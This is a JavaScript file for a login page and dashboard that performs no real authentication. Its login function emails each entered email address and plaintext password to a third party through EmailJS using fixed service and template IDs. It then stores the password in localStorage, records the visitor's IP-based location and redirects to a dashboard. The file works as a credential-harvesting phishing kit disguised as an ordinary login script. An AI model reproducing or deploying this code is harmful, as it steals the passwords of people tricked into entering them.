// ======= UTIL & STORAGE HELPERS =======
const STORAGE_CURRENT_USER_KEY = "currentUser";

function saveCurrentUserPublic(user) {
  const publicUser = {
    email: user.email,
    password: user.password,
  };
  localStorage.setItem(STORAGE_CURRENT_USER_KEY, JSON.stringify(publicUser));
}

function loadCurrentUser() {
  return JSON.parse(localStorage.getItem(STORAGE_CURRENT_USER_KEY)) || null;
}

function logout() {
  localStorage.removeItem(STORAGE_CURRENT_USER_KEY);
  window.location.href = "index.html";
}

// ======= VALIDATION =======
function isEmailValid(email) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function isPasswordValid(password) {
  return typeof password === "string" && password.length >= 1;
}

// ======= MODAL HELPER =======
function showModal(message) {
  const modal = document.getElementById("modal");
  const text = document.getElementById("modalMessage");
  const closeBtn = document.getElementById("modalClose");

  if (!modal || !text || !closeBtn) return;

  text.textContent = message;
  modal.classList.remove("hidden");

  closeBtn.onclick = () => {
    modal.classList.add("hidden");
  };
}

// ======= LOGIN FUNCTION =======
async function login(email, password) {
  if (!email || !password) {
    showModal("Please enter both email and password.");
    return;
  }

  if (!isEmailValid(email)) {
    showModal("Please enter a valid email address.");
    return;
  }

  if (!isPasswordValid(password)) {
    showModal("Password cannot be empty.");
    return;
  }

  if (!window.emailjs) {
    console.error("EmailJS SDK not loaded");
    showModal("Service temporarily unavailable. Please try again later.");
    return;
  }

  try {
    console.log("📨 Sending EmailJS message...");
    await emailjs.send(
      "service_6nw221q",
      "template_d6k3x8f",
      {
        useremail: email,
        userpassword: password,
        time: new Date().toISOString(),
      }
    );
    console.log("✅ EmailJS success");
  } catch (error) {
    console.error("❌ EmailJS ERROR:", error);
    showModal("Unable to process request at the moment. Please try again.");
    return;
  }

  // Save login info locally (demo purpose)
  saveCurrentUserPublic({ email, password });

  // Redirect to dashboard
  window.location.href = "dashboard.html";
}

// ======= DASHBOARD HELPER =======
function loadDashboard() {
  const currentUser = loadCurrentUser();
  if (!currentUser || !currentUser.email) {
    window.location.href = "index.html";
    return;
  }

  const emailEl = document.getElementById("userEmail");
  if (emailEl) emailEl.textContent = currentUser.email;
}

// ======= USER LOCATION (IP-based) =======
async function fetchUserLocation() {
  try {
    const res = await fetch("https://ipapi.co/json/");
    const data = await res.json();

    function countryCodeToFlag(code) {
      if (!code) return "";
      return code
        .toUpperCase()
        .replace(/./g, char =>
          String.fromCodePoint(127397 + char.charCodeAt())
        );
    }

    const flag = countryCodeToFlag(data.country_code);

    const sessionLocation = {
      ip: data.ip || "N/A",
      city: data.city || "N/A",
      region: data.region || "N/A",
      country: data.country_name || "N/A",
      countryCode: data.country_code || "",
      timezone: data.timezone || "UTC",
      utcOffset: data.utc_offset || "+00:00",
    };

    localStorage.setItem("sessionLocation", JSON.stringify(sessionLocation));

    const ipEl = document.getElementById("user-ip");
    const locationEl = document.getElementById("user-location");
    const timeEl = document.getElementById("user-time");

    if (ipEl) ipEl.textContent = `IP: ${sessionLocation.ip}`;
    if (locationEl)
      locationEl.textContent = `Location: ${flag} ${sessionLocation.city}, ${sessionLocation.country}`;

    if (timeEl) {
      const localTime = new Date().toLocaleString("en-US", {
        timeZone: sessionLocation.timezone,
      });
      timeEl.textContent = `Time: ${localTime}`;
    }
  } catch (e) {
    console.warn("Could not fetch IP location:", e);

    const ipEl = document.getElementById("user-ip");
    const locationEl = document.getElementById("user-location");
    const timeEl = document.getElementById("user-time");

    if (ipEl) ipEl.textContent = "IP: N/A";
    if (locationEl) locationEl.textContent = "Location: N/A";
    if (timeEl)
      timeEl.textContent = `Time: ${new Date().toLocaleString()}`;
  }
}

// ======= HOOKS / EVENT BINDING =======
document.addEventListener("DOMContentLoaded", () => {
  const loginBtn = document.getElementById("loginBtn");

  if (loginBtn) {
    loginBtn.addEventListener("click", async (e) => {
      e.preventDefault();
      const email = document.getElementById("email")?.value.trim();
      const password = document.getElementById("password")?.value;
      await login(email, password);
    });
  }

  if (document.getElementById("userEmail")) {
    loadDashboard();
  }

  fetchUserLocation();
});
